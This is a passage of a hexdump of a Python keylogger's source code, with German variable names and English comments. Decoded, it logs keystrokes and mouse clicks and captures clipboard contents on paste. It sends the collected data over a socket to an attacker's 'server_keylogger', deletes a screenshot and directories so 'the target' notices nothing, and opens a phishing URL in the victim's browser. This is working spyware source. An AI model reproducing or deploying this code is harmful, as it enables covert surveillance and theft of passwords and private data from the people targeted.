+-00001420: 2062 6520 7468 6520 7361 6d65 2074 6865   be the same the
+-00001430: 2073 6572 7665 725f 7068 6f74 6f73 2061   server_photos a
+-00001440: 6e64 2074 6865 2073 6572 7665 725f 6b65  nd the server_ke
+-00001450: 796c 6f67 6765 7220 7368 6f75 6c64 6e27  ylogger shouldn'
+-00001460: 7420 6265 0d0a 2020 2020 2020 2020 2020  t be..          
+-00001470: 2020 2320 696e 2074 6865 2073 616d 6520    # in the same 
+-00001480: 666f 6c64 6572 0d0a 2020 2020 2020 2020  folder..        
+-00001490: 2020 2020 7365 6c66 2e63 6f6f 7264 696e      self.coordin
+-000014a0: 6174 6573 203d 206c 6973 7428 7365 7428  ates = list(set(
+-000014b0: 7365 6c66 2e63 6f6f 7264 696e 6174 6573  self.coordinates
+-000014c0: 2929 0d0a 2020 2020 2020 2020 2020 2020  ))..            
+-000014d0: 2320 5468 6973 2063 6865 636b 7320 6966  # This checks if
+-000014e0: 2074 6865 2063 6f6f 7264 696e 6174 6573   the coordinates
+-000014f0: 206f 6363 7572 2032 2074 696d 6573 0d0a   occur 2 times..
+-00001500: 2020 2020 2020 2020 2020 2020 7072 696e              prin
+-00001510: 7428 7365 6c66 2e63 6f6f 7264 696e 6174  t(self.coordinat
+-00001520: 6573 290d 0a20 2020 2020 2020 2020 2020  es)..           
+-00001530: 2077 6f72 7420 3d20 2222 0d0a 2020 2020   wort = ""..    
+-00001540: 2020 2020 2020 2020 666f 7220 7a65 6963          for zeic
+-00001550: 6865 6e20 696e 2073 656c 662e 7269 6368  hen in self.rich
+-00001560: 7469 6765 5f6c 6973 7465 3a0d 0a20 2020  tige_liste:..   
+-00001570: 2020 2020 2020 2020 2020 2020 2077 6f72               wor
+-00001580: 7420 2b3d 207a 6569 6368 656e 0d0a 0d0a  t += zeichen....
+-00001590: 2020 2020 2020 2020 2020 2020 2320 5365              # Se
+-000015a0: 6e64 7320 7468 6520 6461 7461 2074 6f20  nds the data to 
+-000015b0: 7365 7276 6572 5f6b 6579 6c6f 6767 6572  server_keylogger
+-000015c0: 0d0a 2020 2020 2020 2020 2020 2020 616c  ..            al
+-000015d0: 6c5f 6461 7461 203d 2073 7472 2873 656c  l_data = str(sel
+-000015e0: 662e 636f 6f72 6469 6e61 7465 7329 202b  f.coordinates) +
+-000015f0: 2077 6f72 740d 0a20 2020 2020 2020 2020   wort..         
+-00001600: 2020 2023 2043 6f6f 7264 696e 6174 6573     # Coordinates
+-00001610: 2061 6e64 206b 6579 6461 7461 2061 7265   and keydata are
+-00001620: 2062 6569 6e67 2063 6f6e 6361 7465 6e61   being concatena
+-00001630: 7465 640d 0a20 2020 2020 2020 2020 2020  ted..           
+-00001640: 206b 6579 5f64 6174 612e 7365 6e64 2861   key_data.send(a
+-00001650: 6c6c 5f64 6174 612e 656e 636f 6465 2829  ll_data.encode()
+-00001660: 290d 0a20 2020 2020 2020 2020 2020 2070  )..            p
+-00001670: 7269 6e74 2877 6f72 7429 0d0a 2020 2020  rint(wort)..    
+-00001680: 2020 2020 2020 2020 7072 696e 7428 7365          print(se
+-00001690: 6c66 2e72 6963 6874 6967 655f 6c69 7374  lf.richtige_list
+-000016a0: 6529 0d0a 2020 2020 2020 2020 2020 2020  e)..            
+-000016b0: 6668 616e 646c 652e 636c 6f73 6528 290d  fhandle.close().
+-000016c0: 0a20 2020 2020 2020 2020 2020 2023 2043  .            # C
+-000016d0: 6c6f 7365 7320 7468 6520 696d 6167 650d  loses the image.
+-000016e0: 0a20 2020 2020 2020 2020 2020 206f 732e  .            os.
+-000016f0: 7265 6d6f 7665 2822 496d 6167 652e 706e  remove("Image.pn
+-00001700: 6722 290d 0a20 2020 2020 2020 2020 2020  g")..           
+-00001710: 2023 2044 656c 6574 6573 2074 6865 2069   # Deletes the i
+-00001720: 6d61 6765 2069 6e20 7468 6520 6375 7272  mage in the curr
+-00001730: 656e 7420 6469 7265 6374 6f72 790d 0a20  ent directory.. 
+-00001740: 2020 2020 2020 2020 2020 206f 732e 6368             os.ch
+-00001750: 6469 7228 222e 2e22 290d 0a20 2020 2020  dir("..")..     
+-00001760: 2020 2020 2020 2023 2057 6520 6861 7665         # We have
+-00001770: 2074 6f20 676f 2062 6163 6b20 736f 2074   to go back so t
+-00001780: 6861 7420 7765 2063 616e 2064 656c 6574  hat we can delet
+-00001790: 6520 7468 6520 6f74 6865 7220 6469 7265  e the other dire
+-000017a0: 6374 6f72 6965 730d 0a20 2020 2020 2020  ctories..       
+-000017b0: 2020 2020 2066 6f72 2065 6163 685f 6469       for each_di
+-000017c0: 7220 696e 2072 616e 646f 6d5f 6c73 743a  r in random_lst:
+-000017d0: 0d0a 2020 2020 2020 2020 2020 2020 2020  ..              
+-000017e0: 2020 6f73 2e73 7973 7465 6d28 6622 726d    os.system(f"rm
+-000017f0: 6469 7220 7b65 6163 685f 6469 727d 2229  dir {each_dir}")
+-00001800: 0d0a 2020 2020 2020 2020 2020 2020 2020  ..              
+-00001810: 2020 2320 5468 6973 2064 656c 6574 6573    # This deletes
+-00001820: 2065 7665 7279 2064 6972 6563 746f 7279   every directory
+-00001830: 0d0a 2020 2020 2020 2020 2020 2020 7379  ..            sy
+-00001840: 732e 6578 6974 2829 0d0a 2020 2020 2020  s.exit()..      
+-00001850: 2020 2020 2020 2320 5374 6f70 7320 7468        # Stops th
+-00001860: 6520 6b65 796c 6f67 6765 720d 0a20 2020  e keylogger..   
+-00001870: 2020 2020 2065 7863 6570 7420 4b65 7962       except Keyb
+-00001880: 6f61 7264 496e 7465 7272 7570 743a 0d0a  oardInterrupt:..
+-00001890: 2020 2020 2020 2020 2020 2020 2320 4966              # If
+-000018a0: 2074 6865 2074 6172 6765 7420 6861 7320   the target has 
+-000018b0: 6465 7374 726f 7965 6420 7468 6520 636f  destroyed the co
+-000018c0: 6e6e 6563 7469 6f6e 0d0a 2020 2020 2020  nnection..      
+-000018d0: 2020 2020 2020 776f 7274 203d 2022 2a2a        wort = "**
+-000018e0: 2a25 c2a7 c2a7 29c2 a7c2 a725 220d 0a20  *%....)....%".. 
+-000018f0: 2020 2020 2020 2020 2020 2023 2054 6869             # Thi
+-00001900: 7320 6973 206c 696b 6520 6120 7370 6563  s is like a spec
+-00001910: 6961 6c20 636f 6465 2e20 546f 2073 706c  ial code. To spl
+-00001920: 6974 2069 7420 6174 2074 6865 2065 6e64  it it at the end
+-00001930: 0d0a 2020 2020 2020 2020 2020 2020 666f  ..            fo
+-00001940: 7220 7a65 6963 6865 6e20 696e 2073 656c  r zeichen in sel
+-00001950: 662e 7269 6368 7469 6765 5f6c 6973 7465  f.richtige_liste
+-00001960: 3a0d 0a20 2020 2020 2020 2020 2020 2020  :..             
+-00001970: 2020 2077 6f72 7420 2b3d 207a 6569 6368     wort += zeich
+-00001980: 656e 0d0a 2020 2020 2020 2020 2020 2020  en..            
+-00001990: 6461 7461 203d 2066 2254 4845 2043 4f4e  data = f"THE CON
+-000019a0: 4e45 4354 494f 4e20 4841 5320 4245 454e  NECTION HAS BEEN
+-000019b0: 2049 4e54 4552 5255 5054 4544 7b77 6f72   INTERRUPTED{wor
+-000019c0: 747d 220d 0a20 2020 2020 2020 2020 2020  t}"..           
+-000019d0: 2023 2054 6869 7320 6c65 7427 7320 7468   # This let's th
+-000019e0: 6520 7365 7276 6572 206b 6e6f 7720 7468  e server know th
+-000019f0: 6174 2074 6865 2073 6572 7665 7220 7368  at the server sh
+-00001a00: 6f75 6c64 2073 6875 7420 646f 776e 0d0a  ould shut down..
+-00001a10: 2020 2020 2020 2020 2020 2020 6b65 795f              key_
+-00001a20: 6461 7461 2e63 6f6e 6e65 6374 2828 6970  data.connect((ip
+-00001a30: 5f6b 6579 6c6f 6767 6572 2c20 706f 7274  _keylogger, port
+-00001a40: 5f6b 6579 6c6f 6767 6572 2929 0d0a 2020  _keylogger))..  
+-00001a50: 2020 2020 2020 2020 2020 6b65 795f 6461            key_da
+-00001a60: 7461 2e73 656e 6428 6461 7461 2e65 6e63  ta.send(data.enc
+-00001a70: 6f64 6528 2929 0d0a 2020 2020 2020 2020  ode())..        
+-00001a80: 2020 2020 6b65 795f 6461 7461 2e63 6c6f      key_data.clo
+-00001a90: 7365 2829 0d0a 0d0a 2020 2020 2020 2020  se()....        
+-00001aa0: 2020 2020 6966 206f 732e 7061 7468 2e65      if os.path.e
+-00001ab0: 7869 7374 7328 2249 6d61 6765 2e70 6e67  xists("Image.png
+-00001ac0: 2229 3a0d 0a20 2020 2020 2020 2020 2020  "):..           
+-00001ad0: 2020 2020 2023 2049 7420 7769 6c6c 2064       # It will d
+-00001ae0: 6573 7472 6f79 2074 6865 2069 6d61 6765  estroy the image
+-00001af0: 2073 6f20 7461 7267 6574 2077 6f75 6e64   so target wound
+-00001b00: 206b 6e6f 7720 616e 7974 6869 6e67 0d0a   know anything..
+-00001b10: 2020 2020 2020 2020 2020 2020 2020 2020                  
+-00001b20: 6668 616e 646c 652e 636c 6f73 6528 290d  fhandle.close().
+-00001b30: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
+-00001b40: 206f 732e 7265 6d6f 7665 2822 496d 6167   os.remove("Imag
+-00001b50: 652e 706e 6722 290d 0a20 2020 2020 2020  e.png")..       
+-00001b60: 2020 2020 2023 2054 6869 7320 7265 6d6f       # This remo
+-00001b70: 7665 7320 7468 6520 696d 6167 650d 0a0d  ves the image...
+-00001b80: 0a20 2020 2064 6566 206b 696c 6c5f 7377  .    def kill_sw
+-00001b90: 6974 6368 2873 656c 6629 3a0d 0a20 2020  itch(self):..   
+-00001ba0: 2020 2020 2023 2054 6869 7320 6675 6e63       # This func
+-00001bb0: 7469 6f6e 2064 6573 7472 6f79 7320 7468  tion destroys th
+-00001bc0: 6520 6d6f 7573 6520 696e 666f 0d0a 2020  e mouse info..  
+-00001bd0: 2020 2020 2020 6e65 775f 7365 636f 6e64        new_second
+-00001be0: 7320 3d20 7365 6c66 2e64 7572 6174 696f  s = self.duratio
+-00001bf0: 6e20 2b20 350d 0a20 2020 2020 2020 2023  n + 5..        #
+-00001c00: 2032 3020 7365 636f 6e64 7320 6172 6520   20 seconds are 
+-00001c10: 6265 696e 6720 6164 6465 6420 6265 6361  being added beca
+-00001c20: 7573 6520 7468 6572 6520 6d69 6768 7420  use there might 
+-00001c30: 6265 2061 2070 726f 626c 656d 0d0a 2020  be a problem..  
+-00001c40: 2020 2020 2020 666f 7220 7820 696e 2072        for x in r
+-00001c50: 616e 6765 286e 6577 5f73 6563 6f6e 6473  ange(new_seconds
+-00001c60: 293a 0d0a 2020 2020 2020 2020 2020 2020  ):..            
+-00001c70: 7469 6d65 2e73 6c65 6570 2831 290d 0a20  time.sleep(1).. 
+-00001c80: 2020 2020 2020 2023 2054 6869 7320 7374         # This st
+-00001c90: 6f70 6573 2074 6865 0d0a 2020 2020 2020  opes the..      
+-00001ca0: 2020 7379 732e 6578 6974 2829 0d0a 0d0a    sys.exit()....
+-00001cb0: 2020 2020 6465 6620 6f6e 5f63 6c69 636b      def on_click
+-00001cc0: 2873 656c 662c 2078 2c20 792c 2062 7574  (self, x, y, but
+-00001cd0: 746f 6e2c 2070 7265 7373 6564 293a 0d0a  ton, pressed):..
+-00001ce0: 2020 2020 2020 2020 2320 5468 6973 2069          # This i
+-00001cf0: 7320 7468 6520 636c 6963 6b20 6675 6e63  s the click func
+-00001d00: 7469 6f6e 0d0a 2020 2020 2020 2020 7072  tion..        pr
+-00001d10: 696e 7428 6622 5461 7267 6574 2068 6173  int(f"Target has
+-00001d20: 2070 7265 7373 6564 207b 787d 2061 6e64   pressed {x} and
+-00001d30: 207b 797d 2229 0d0a 2020 2020 2020 2020   {y}")..        
+-00001d40: 2320 416c 6c20 7468 6520 636f 6f72 6469  # All the coordi
+-00001d50: 6e61 7465 7320 7769 6c6c 2062 6520 7374  nates will be st
+-00001d60: 6f72 6564 2069 6e20 2273 656c 662e 636f  ored in "self.co
+-00001d70: 6f72 6469 6e61 7465 7322 0d0a 2020 2020  ordinates"..    
+-00001d80: 2020 2020 7365 6c66 2e63 6f6f 7264 696e      self.coordin
+-00001d90: 6174 6573 2e61 7070 656e 6428 2878 2c20  ates.append((x, 
+-00001da0: 7929 290d 0a0d 0a20 2020 2064 6566 2061  y))....    def a
+-00001db0: 6c6c 5f63 6c69 636b 7328 7365 6c66 293a  ll_clicks(self):
+-00001dc0: 0d0a 2020 2020 2020 2020 2320 5468 6973  ..        # This
+-00001dd0: 2069 7320 6a75 7374 2061 2066 756e 6374   is just a funct
+-00001de0: 696f 6e20 736f 2069 7420 6361 6e20 6265  ion so it can be
+-00001df0: 2072 616e 2077 6974 6820 7468 7265 6164   ran with thread
+-00001e00: 696e 670d 0a20 2020 2020 2020 2077 6974  ing..        wit
+-00001e10: 6820 4c69 7374 656e 6572 286f 6e5f 636c  h Listener(on_cl
+-00001e20: 6963 6b3d 7365 6c66 2e6f 6e5f 636c 6963  ick=self.on_clic
+-00001e30: 6b29 2061 7320 6c69 7374 656e 696e 673a  k) as listening:
+-00001e40: 0d0a 2020 2020 2020 2020 2020 2020 7365  ..            se
+-00001e50: 6c66 2e6b 696c 6c5f 7377 6974 6368 2829  lf.kill_switch()
+-00001e60: 0d0a 2020 2020 2020 2020 2020 2020 6c69  ..            li
+-00001e70: 7374 656e 696e 672e 6a6f 696e 2829 0d0a  stening.join()..
+-00001e80: 2020 2020 0d0a 2020 2020 6465 6620 636f      ..    def co
+-00001e90: 7079 5f64 6174 6128 7365 6c66 293a 0d0a  py_data(self):..
+-00001ea0: 2020 2020 2020 2020 7365 6c66 2e72 6963          self.ric
+-00001eb0: 6874 6967 655f 6c69 7374 652e 6170 7065  htige_liste.appe
+-00001ec0: 6e64 2822 2028 434f 5059 2028 5374 7267  nd(" (COPY (Strg
+-00001ed0: 2b63 2929 2022 290d 0a0d 0a20 2020 2064  +c)) ")....    d
+-00001ee0: 6566 2061 7070 656e 645f 7061 7374 6528  ef append_paste(
+-00001ef0: 7365 6c66 293a 0d0a 2020 2020 2020 2020  self):..        
+-00001f00: 6461 7461 203d 2066 2220 287b 7079 7065  data = f" ({pype
+-00001f10: 7263 6c69 702e 7061 7374 6528 297d 207c  rclip.paste()} |
+-00001f20: 2050 4153 5445 2028 5374 7267 2b76 2929   PASTE (Strg+v))
+-00001f30: 207c 2022 0d0a 2020 2020 2020 2020 7365   | "..        se
+-00001f40: 6c66 2e72 6963 6874 6967 655f 6c69 7374  lf.richtige_list
+-00001f50: 652e 6170 7065 6e64 2864 6174 6129 0d0a  e.append(data)..
+-00001f60: 0d0a 2020 2020 6465 6620 7072 696e 745f  ..    def print_
+-00001f70: 776f 726b 2873 656c 662c 2077 6f72 6429  work(self, word)
+-00001f80: 3a0d 0a20 2020 2020 2020 2070 7269 6e74  :..        print
+-00001f90: 2866 2741 6c70 6861 6265 7469 7363 6865  (f'Alphabetische
+-00001fa0: 2054 6173 7465 2077 7572 6465 2067 6564   Taste wurde ged
+-00001fb0: 72c3 bc63 6b74 3a20 7b77 6f72 647d 2027  r..ckt: {word} '
+-00001fc0: 290d 0a20 2020 2020 2020 2073 656c 662e  )..        self.
+-00001fd0: 7269 6368 7469 6765 5f6c 6973 7465 202b  richtige_liste +
+-00001fe0: 3d20 776f 7264 0d0a 2020 2020 2020 2020  = word..        
+-00001ff0: 2320 4576 6572 7920 7072 6573 7365 6420  # Every pressed 
+-00002000: 6b65 7920 7769 6c6c 2062 6520 7361 7665  key will be save
+-00002010: 6420 696e 2022 7269 6368 7469 6765 5f6c  d in "richtige_l
+-00002020: 6973 7465 2220 7468 6973 2069 7320 6120  iste" this is a 
+-00002030: 6765 726d 616e 2077 6f72 6420 616e 6420  german word and 
+-00002040: 6d65 616e 7320 2272 6967 6874 5f6c 6973  means "right_lis
+-00002050: 7422 0d0a 0d0a 2020 2020 6465 6620 6f6e  t"....    def on
+-00002060: 5f70 7265 7373 2873 656c 662c 206b 6579  _press(self, key
+-00002070: 293a 0d0a 2020 2020 2020 2020 7472 793a  ):..        try:
+-00002080: 0d0a 2020 2020 2020 2020 2020 2020 7472  ..            tr
+-00002090: 793a 0d0a 2020 2020 2020 2020 2020 2020  y:..            
+-000020a0: 2020 2020 6f74 6865 725f 6368 6172 6563      other_charec
+-000020b0: 7465 7273 203d 207b 2231 223a 2022 2122  ters = {"1": "!"
+-000020c0: 2c20 2232 223a 2027 2227 2c20 2233 223a  , "2": '"', "3":
+-000020d0: 2022 c2a7 222c 2022 3422 3a20 2224 222c   "..", "4": "$",
+-000020e0: 2022 3522 3a20 2225 222c 2022 3622 3a20   "5": "%", "6": 
+-000020f0: 2226 222c 2022 3722 3a20 222f 222c 2022  "&", "7": "/", "
+-00002100: 3822 3a20 2228 222c 0d0a 2020 2020 2020  8": "(",..      
+-00002110: 2020 2020 2020 2020 2020 2020 2020 2020                  
+-00002120: 2020 2020 2020 2020 2020 2020 2020 2239                "9
+-00002130: 223a 2022 2922 2c20 2230 223a 2022 3d22  ": ")", "0": "="
+-00002140: 2c20 22c3 9f22 3a20 223f 227d 0d0a 2020  , "..": "?"}..  
+-00002150: 2020 2020 2020 2020 2020 2020 2020 6966                if
+-00002160: 2073 656c 662e 6361 7073 2069 7320 5472   self.caps is Tr
+-00002170: 7565 3a0d 0a20 2020 2020 2020 2020 2020  ue:..           
+-00002180: 2020 2020 2020 2020 2069 6620 6b65 792e           if key.
+-00002190: 6368 6172 2069 6e20 6f74 6865 725f 6368  char in other_ch
+-000021a0: 6172 6563 7465 7273 3a0d 0a20 2020 2020  arecters:..     
+-000021b0: 2020 2020 2020 2020 2020 2020 2020 2020                  
+-000021c0: 2020 2077 6f72 6420 3d20 6f74 6865 725f     word = other_
+-000021d0: 6368 6172 6563 7465 7273 5b6b 6579 2e63  charecters[key.c
+-000021e0: 6861 725d 0d0a 2020 2020 2020 2020 2020  har]..          
+-000021f0: 2020 2020 2020 2020 2020 2020 2020 2320                # 
+-00002200: 5570 7065 7220 4368 6172 6163 7465 7273  Upper Characters
+-00002210: 2066 726f 6d20 2231 2220 746f 2022 3022   from "1" to "0"
+-00002220: 2062 6563 6175 7365 2061 6c6c 2074 6869   because all thi
+-00002230: 7320 6e75 6d62 6572 7320 6172 6520 6e6f  s numbers are no
+-00002240: 7420 6368 6172 6563 7465 7273 2061 7265  t charecters are
+-00002250: 206e 6f74 2069 6e20 7079 6e70 7574 0d0a   not in pynput..
+-00002260: 2020 2020 2020 2020 2020 2020 2020 2020                  
+-00002270: 2020 2020 656c 7365 3a0d 0a20 2020 2020      else:..     
+-00002280: 2020 2020 2020 2020 2020 2020 2020 2020                  
+-00002290: 2020 2077 6f72 6420 3d20 6b65 792e 6368     word = key.ch
+-000022a0: 6172 2e75 7070 6572 2829 0d0a 2020 2020  ar.upper()..    
+-000022b0: 2020 2020 2020 2020 2020 2020 656c 7365              else
+-000022c0: 3a0d 0a20 2020 2020 2020 2020 2020 2020  :..             
+-000022d0: 2020 2020 2020 2077 6f72 6420 3d20 6b65         word = ke
+-000022e0: 792e 6368 6172 0d0a 0d0a 2020 2020 2020  y.char....      
+-000022f0: 2020 2020 2020 2020 2020 616c 6c5f 7265            all_re
+-00002300: 715f 6b65 7973 203d 207b 2203 223a 2073  q_keys = {".": s
+-00002310: 656c 662e 636f 7079 5f64 6174 612c 2022  elf.copy_data, "
+-00002320: 1622 3a20 7365 6c66 2e61 7070 656e 645f  .": self.append_
+-00002330: 7061 7374 657d 0d0a 2020 2020 2020 2020  paste}..        
+-00002340: 2020 2020 2020 2020 666f 7220 6561 6368          for each
+-00002350: 5f6b 6579 2069 6e20 616c 6c5f 7265 715f  _key in all_req_
+-00002360: 6b65 7973 3a0d 0a20 2020 2020 2020 2020  keys:..         
+-00002370: 2020 2020 2020 2020 2020 2069 6620 6561             if ea
+-00002380: 6368 5f6b 6579 203d 3d20 6b65 792e 6368  ch_key == key.ch
+-00002390: 6172 3a0d 0a20 2020 2020 2020 2020 2020  ar:..           
+-000023a0: 2020 2020 2020 2020 2020 2020 2061 6c6c               all
+-000023b0: 5f72 6571 5f6b 6579 735b 6561 6368 5f6b  _req_keys[each_k
+-000023c0: 6579 5d28 290d 0a20 2020 2020 2020 2020  ey]()..         
+-000023d0: 2020 2020 2020 2074 7279 3a0d 0a20 2020         try:..   
+-000023e0: 2020 2020 2020 2020 2020 2020 2020 2020                  
+-000023f0: 2061 7363 695f 6e75 6d62 6572 203d 206f   asci_number = o
+-00002400: 7264 2877 6f72 6429 0d0a 2020 2020 2020  rd(word)..      
+-00002410: 2020 2020 2020 2020 2020 2020 2020 6966                if
+-00002420: 2061 7363 695f 6e75 6d62 6572 206e 6f74   asci_number not
+-00002430: 2069 6e20 7261 6e67 6528 302c 2033 3229   in range(0, 32)
+-00002440: 3a0d 0a20 2020 2020 2020 2020 2020 2020  :..             
+-00002450: 2020 2020 2020 2020 2020 2073 656c 662e             self.
+-00002460: 7072 696e 745f 776f 726b 2877 6f72 6429  print_work(word)
+-00002470: 0d0a 0d0a 2020 2020 2020 2020 2020 2020  ....            
+-00002480: 2020 2020 6578 6365 7074 2054 7970 6545      except TypeE
+-00002490: 7272 6f72 3a0d 0a20 2020 2020 2020 2020  rror:..         
+-000024a0: 2020 2020 2020 2020 2020 2073 656c 662e             self.
+-000024b0: 7072 696e 745f 776f 726b 2877 6f72 6429  print_work(word)
+-000024c0: 0d0a 0d0a 2020 2020 2020 2020 2020 2020  ....            
+-000024d0: 2020 2020 7072 696e 7428 7365 6c66 2e72      print(self.r
+-000024e0: 6963 6874 6967 655f 6c69 7374 6529 0d0a  ichtige_liste)..
+-000024f0: 2020 2020 2020 2020 2020 2020 6578 6365              exce
+-00002500: 7074 2054 7970 6545 7272 6f72 3a0d 0a20  pt TypeError:.. 
+-00002510: 2020 2020 2020 2020 2020 2020 2020 2070                 p
+-00002520: 6173 730d 0a0d 0a20 2020 2020 2020 2065  ass....        e
+-00002530: 7863 6570 7420 4174 7472 6962 7574 6545  xcept AttributeE
+-00002540: 7272 6f72 3a0d 0a20 2020 2020 2020 2020  rror:..         
+-00002550: 2020 2070 7269 6e74 2866 2745 696e 6520     print(f'Eine 
+-00002560: 616e 6465 7265 2054 6173 7465 2077 7572  andere Taste wur
+-00002570: 6465 2067 6564 72c3 bc63 6b74 3a20 7b6b  de gedr..ckt: {k
+-00002580: 6579 7d27 290d 0a20 2020 2020 2020 2020  ey}')..         
+-00002590: 2020 2069 6620 6b65 7920 3d3d 206b 6579     if key == key
+-000025a0: 626f 6172 642e 4b65 792e 7370 6163 6520  board.Key.space 
+-000025b0: 6f72 206b 6579 203d 3d20 6b65 7962 6f61  or key == keyboa
+-000025c0: 7264 2e4b 6579 2e74 6162 3a0d 0a20 2020  rd.Key.tab:..   
+-000025d0: 2020 2020 2020 2020 2020 2020 2073 656c               sel
+-000025e0: 662e 7269 6368 7469 6765 5f6c 6973 7465  f.richtige_liste
+-000025f0: 202b 3d20 227b 220d 0a20 2020 2020 2020   += "{"..       
+-00002600: 2020 2020 2020 2020 2023 2049 6620 7468           # If th
+-00002610: 6520 7461 7267 6574 2070 7265 7373 6573  e target presses
+-00002620: 2074 6162 206f 7220 7370 6163 6520 6120   tab or space a 
+-00002630: 227b 2220 7769 6c6c 2062 6520 6170 7065  "{" will be appe
+-00002640: 6e64 6564 2074 6f20 7468 6520 6c69 7374  nded to the list
+-00002650: 2073 6f20 7468 6520 6174 7461 636b 6572   so the attacker
+-00002660: 206b 6e6f 7773 2077 6865 6e20 616e 640d   knows when and.
+-00002670: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
+-00002680: 2023 2073 7061 6365 206f 7220 6120 7461   # space or a ta
+-00002690: 6220 6b65 7920 6861 7320 6265 656e 2070  b key has been p
+-000026a0: 7265 7373 6564 0d0a 2020 2020 2020 2020  ressed..        
+-000026b0: 2020 2020 656c 6966 206b 6579 203d 3d20      elif key == 
+-000026c0: 6b65 7962 6f61 7264 2e4b 6579 2e63 6170  keyboard.Key.cap
+-000026d0: 735f 6c6f 636b 3a0d 0a20 2020 2020 2020  s_lock:..       
+-000026e0: 2020 2020 2020 2020 2073 656c 662e 6361           self.ca
+-000026f0: 7073 203d 2054 7275 650d 0a20 2020 2020  ps = True..     
+-00002700: 2020 2020 2020 2020 2020 2073 656c 662e             self.
+-00002710: 6368 6563 6b2e 6170 7065 6e64 2831 290d  check.append(1).
+-00002720: 0a20 2020 2020 2020 2020 2020 2063 6865  .            che
+-00002730: 636b 5f63 6170 7320 3d20 7375 6d28 7365  ck_caps = sum(se
+-00002740: 6c66 2e63 6865 636b 2920 2f20 320d 0a20  lf.check) / 2.. 
+-00002750: 2020 2020 2020 2020 2020 2023 2049 6620             # If 
+-00002760: 6368 6563 6b5f 6361 7073 2069 7320 6e6f  check_caps is no
+-00002770: 7420 7072 696d 6172 7920 6974 2077 696c  t primary it wil
+-00002780: 6c20 7365 7420 7365 6c66 2e63 6170 7320  l set self.caps 
+-00002790: 746f 2046 616c 7365 0d0a 0d0a 2020 2020  to False....    
+-000027a0: 2020 2020 2020 2020 6966 2073 7472 2863          if str(c
+-000027b0: 6865 636b 5f63 6170 7329 5b2d 315d 2021  heck_caps)[-1] !
+-000027c0: 3d20 2730 273a 0d0a 2020 2020 2020 2020  = '0':..        
+-000027d0: 2020 2020 2020 2020 7061 7373 0d0a 2020          pass..  
+-000027e0: 2020 2020 2020 2020 2020 656c 7365 3a0d            else:.
+-000027f0: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
+-00002800: 2073 656c 662e 6361 7073 203d 2046 616c   self.caps = Fal
+-00002810: 7365 0d0a 0d0a 2020 2020 6465 6620 6f6e  se....    def on
+-00002820: 5f72 656c 6561 7365 2873 656c 662c 206b  _release(self, k
+-00002830: 6579 293a 0d0a 2020 2020 2020 2020 7072  ey):..        pr
+-00002840: 696e 7428 6627 4b65 7920 7265 6c65 6173  int(f'Key releas
+-00002850: 6564 3a20 7b6b 6579 7d27 290d 0a0d 0a20  ed: {key}').... 
+-00002860: 2020 2064 6566 2073 7461 7274 2873 656c     def start(sel
+-00002870: 6629 3a0d 0a20 2020 2020 2020 2069 6620  f):..        if 
+-00002880: 7365 6c66 2e70 6869 7368 696e 6720 6973  self.phishing is
+-00002890: 206e 6f74 204e 6f6e 653a 0d0a 2020 2020   not None:..    
+-000028a0: 2020 2020 2020 2020 7768 696c 6520 5472          while Tr
+-000028b0: 7565 3a0d 0a20 2020 2020 2020 2020 2020  ue:..           
+-000028c0: 2020 2020 2074 7279 3a0d 0a20 2020 2020       try:..     
+-000028d0: 2020 2020 2020 2020 2020 2020 2020 2072                 r
+-000028e0: 6573 706f 6e73 6520 3d20 7265 7175 6573  esponse = reques
+-000028f0: 7473 2e67 6574 2873 656c 662e 7068 6973  ts.get(self.phis
+-00002900: 6869 6e67 290d 0a20 2020 2020 2020 2020  hing)..         
+-00002910: 2020 2020 2020 2020 2020 2023 5265 7370             #Resp
+-00002920: 6f6e 6520 6973 2068 6572 6520 746f 2073  one is here to s
+-00002930: 6565 2069 6620 7468 6520 7765 6273 6974  ee if the websit
+-00002940: 6520 6973 206f 6e6c 696e 6520 6f72 206e  e is online or n
+-00002950: 6f74 0d0a 2020 2020 2020 2020 2020 2020  ot..            
+-00002960: 2020 2020 2020 2020 7765 6262 726f 7773          webbrows
+-00002970: 6572 2e6f 7065 6e28 7365 6c66 2e70 6869  er.open(self.phi
+-00002980: 7368 696e 6729 0d0a 2020 2020 2020 2020  shing)..        
+-00002990: 2020 2020 2020 2020 2020 2020 6272 6561              brea
+-000029a0: 6b0d 0a0d 0a20 2020 2020 2020 2020 2020  k....           
+-000029b0: 2020 2020 2065 7863 6570 7420 7265 7175       except requ
+-000029c0: 6573 7473 2e65 7863 6570 7469 6f6e 732e  ests.exceptions.
+-000029d0: 436f 6e6e 6563 7469 6f6e 4572 726f 723a  ConnectionError:
+-000029e0: 0d0a 2020 2020 2020 2020 2020 2020 2020  ..              
+-000029f0: 2020 2020 2020 7072 696e 7428 224e 6f20        print("No 
+-00002a00: 636f 6e6e 6563 7469 6f6e 2229 0d0a 2020  connection")..  
+-00002a10: 2020 2020 2020 2020 2020 2020 2020 2020                  
+-00002a20: 2020 7379 732e 6578 6974 2829 0d0a 0d0a    sys.exit()....
+-00002a30: 2020 2020 2020 2020 6c69 7374 656e 696e          listenin
+-00002a40: 675f 7468 7265 6164 203d 2074 6872 6561  g_thread = threa
+-00002a50: 6469 6e67 2e54 6872 6561 6428 7461 7267  ding.Thread(targ
+-00002a60: 6574 3d73 656c 662e 6461 7465 6e5f 6175  et=self.daten_au
+-00002a70: 666e 6568 656d 656e 290d 0a20 2020 2020  fnehemen)..     
+-00002a80: 2020 2023 2054 6869 7320 7275 6e73 2074     # This runs t
+-00002a90: 6865 2070 726f 6772 616d 6d20 6265 6869  he programm behi
+-00002aa0: 6e64 2074 6865 2061 6374 7561 6c20 7072  nd the actual pr
+-00002ab0: 6f67 7261 6d6d 696e 670d 0a20 2020 2020  ogramming..     
+-00002ac0: 2020 206c 6973 7465 6e69 6e67 5f74 6872     listening_thr
+-00002ad0: 6561 642e 7374 6172 7428 290d 0a0d 0a20  ead.start().... 
+-00002ae0: 2020 2020 2020 2074 6872 6561 6469 6e67         threading
+-00002af0: 5f6d 6f75 7365 203d 2074 6872 6561 6469  _mouse = threadi
+-00002b00: 6e67 2e54 6872 6561 6428 7461 7267 6574  ng.Thread(target
+-00002b10: 3d73 656c 662e 616c 6c5f 636c 6963 6b73  =self.all_clicks
+-00002b20: 290d 0a20 2020 2020 2020 2023 2054 6869  )..        # Thi
+-00002b30: 7320 7275 6e73 2074 6865 2070 726f 6772  s runs the progr
+-00002b40: 616d 6d20 6265 6869 6e64 2074 6865 2061  amm behind the a
